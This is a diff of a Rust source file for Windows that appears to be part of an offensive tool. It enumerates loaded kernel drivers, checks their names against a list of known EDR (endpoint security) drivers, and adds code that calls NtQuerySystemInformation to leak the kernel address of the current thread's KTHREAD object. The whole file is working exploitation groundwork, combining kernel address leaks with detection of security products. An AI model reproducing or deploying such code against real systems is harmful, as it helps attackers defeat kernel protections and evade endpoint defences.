@@ -1,12 +1,51 @@
 use std::ffi::{OsString};
 use std::os::windows::ffi::OsStringExt;
+use std::ffi::{c_void, CString};
+use std::ptr::null_mut;
+use std::slice::from_raw_parts;
 
 use winapi::shared::minwindef::{DWORD, LPVOID};
+use winapi::shared::ntdef::HANDLE;
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::psapi::{EnumDeviceDrivers, GetDeviceDriverBaseNameW};
+use winapi::um::processthreadsapi::{OpenThread, GetCurrentThreadId};
+use winapi::shared::ntdef::{NTSTATUS, ULONG};
+use winapi::um::winnt::{THREAD_QUERY_INFORMATION, THREAD_ALL_ACCESS};
+use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
+
+// NTSTATUS codes (simplified)
+const STATUS_SUCCESS: NTSTATUS = 0;
+const STATUS_INFO_LENGTH_MISMATCH: NTSTATUS = -1073741820; // 0xC0000004
+const SystemHandleInformation: ULONG = 0x10;
+const ObjectThreadType: u8 = 0x08; // This value is version-dependent; adjust per target OS
+
+#[repr(C)]
+#[derive(Debug)]
+struct SYSTEM_HANDLE {
+    ProcessId: u32,
+    ObjectTypeIndex: u8,
+    Flags: u8,
+    HandleValue: u16,
+    Object: *mut c_void,
+    GrantedAccess: u32,
+}
+
+#[repr(C)]
+#[derive(Debug)]
+struct SYSTEM_HANDLE_INFORMATION {
+    NumberOfHandles: ULONG,
+    Handles: [SYSTEM_HANDLE; 1], // flexible array
+}
+
+type NtQuerySystemInformationFn = unsafe extern "system" fn(
+    system_information_class: ULONG,
+    system_information: *mut std::ffi::c_void,
+    system_information_length: ULONG,
+    return_length: *mut ULONG,
+) -> NTSTATUS;
 
 
-/// Get the base address of a loaded driver (e.g., "ntoskrnl.exe" or "fltmgr.sys")
+// Get the base address of a loaded driver (e.g., "ntoskrnl.exe" or "fltmgr.sys")
 pub fn get_driver_base(drv_name: &str) -> Option<LPVOID> {
     unsafe {
         let mut drivers: Vec<LPVOID> = Vec::with_capacity(1024);
@@ -48,8 +87,9 @@ pub fn get_driver_base(drv_name: &str) -> Option<LPVOID> {
     None
 }
 
-/// Find the driver name given a kernel address.
-/// If the address belongs inside a driver/module, returns its name.
+
+// Find the driver name given a kernel address.
+// If the address belongs inside a driver/module, returns its name.
 pub fn find_driver_name_from_addr(address: u64) -> Option<String> {
     unsafe {
         const MAX_DRIVERS: usize = 1024;
@@ -112,7 +152,7 @@ pub fn find_driver_name_from_addr(address: u64) -> Option<String> {
 }
 
 
-/// Check if the provided driver name matches a known EDR driver.
+// Check if the provided driver name matches a known EDR driver.
 pub fn is_driver_name_matching_edr(driver: &str) -> bool {
     // Known EDR driver list (to be expanded as needed)
     const EDR_DRIVERS: &[&str] = &[
@@ -152,3 +192,118 @@ pub fn is_driver_name_matching_edr(driver: &str) -> bool {
     false
 }
 
+// Resolve NtQuerySystemInformation
+fn resolve_ntqsi() -> Option<NtQuerySystemInformationFn> {
+    unsafe {
+        let module_name = CString::new("ntdll.dll").unwrap();
+        let func_name = CString::new("NtQuerySystemInformation").unwrap();
+
+        let h_module = GetModuleHandleA(module_name.as_ptr());
+        if h_module.is_null() {
+            eprintln!("[-] Failed to get module handle: {}", GetLastError());
+            return None;
+        }
+
+        let proc = GetProcAddress(h_module, func_name.as_ptr());
+        if proc.is_null() {
+            eprintln!("[-] Failed to get proc address: {}", GetLastError());
+            return None;
+        }
+
+        Some(std::mem::transmute::<_, NtQuerySystemInformationFn>(proc))
+    }
+}
+
+// Generic helper: allocate a buffer, retry until the NT API says it's big enough.
+unsafe fn query_system_information(
+    ntqsi: NtQuerySystemInformationFn,
+    info_class: ULONG,
+) -> Option<Vec<u8>> {
+    let mut buffer_size: ULONG = 4096;
+    let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
+
+    loop {
+        let mut return_length: ULONG = 0;
+        let status = ntqsi(
+            info_class,
+            buffer.as_mut_ptr() as *mut _,
+            buffer_size,
+            &mut return_length,
+        );
+
+        if status == STATUS_SUCCESS {
+            buffer.truncate(return_length as usize);
+            return Some(buffer);
+        } else if status == STATUS_INFO_LENGTH_MISMATCH {
+            buffer_size *= 2; // grow the buffer
+            buffer.resize(buffer_size as usize, 0);
+            continue;
+        } else {
+            eprintln!("[-] NtQuerySystemInformation failed with NTSTATUS=0x{:X}", status);
+            return None;
+        }
+    }
+}
+
+// Loop through handles and return a Vec of object pointers for the current thread
+unsafe fn collect_thread_objects(h_thread: HANDLE, data: &[u8]) -> Vec<*mut core::ffi::c_void> {
+    let header = data.as_ptr() as *const SYSTEM_HANDLE_INFORMATION;
+    let number_of_handles = (*header).NumberOfHandles as usize;
+
+    let first_handle_ptr = &(*header).Handles as *const SYSTEM_HANDLE;
+    let handles_slice = from_raw_parts(first_handle_ptr, number_of_handles);
+
+    let mut kthread_vec: Vec<*mut core::ffi::c_void> = Vec::new();
+
+    for h in handles_slice {
+        if h.HandleValue as HANDLE == h_thread {
+            if h.ObjectTypeIndex == ObjectThreadType {
+                kthread_vec.push(h.Object);
+            }
+        }
+    }
+
+    kthread_vec
+}
+
+// Returns the last KTHREAD object pointer for the current thread
+pub fn get_thread_info() -> Option<*mut core::ffi::c_void> {
+    unsafe {
+        // Get the current thread ID
+        let tid = GetCurrentThreadId();
+
+        // Open a handle to the current thread
+        let h_thread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_ALL_ACCESS, false.into(), tid);
+        if h_thread.is_null() {
+            eprintln!("[-] Failed to open thread handle");
+            return None;
+        }
+
+        // Resolve NtQuerySystemInformation
+        let ntqsi = match resolve_ntqsi() {
+            Some(f) => f,
+            None => return None,
+        };
+
+        // Query SystemHandleInformation
+        let data = match query_system_information(ntqsi, SystemHandleInformation) {
+            Some(d) => d,
+            None => {
+                eprintln!("[-] NtQuerySystemInformation query failed.");
+                return None;
+            }
+        };
+
+        // Collect KTHREAD object pointers for this thread
+        let kthreads = collect_thread_objects(h_thread, &data);
+
+        if kthreads.is_empty() {
+            eprintln!("[-] No kernel thread objects found for this thread.");
+            None
+        } else {
+            let last = *kthreads.last().unwrap();
+            println!("[+] Thread object address in KM: {:?}", last);
+            Some(last)
+        }
+    }
+}
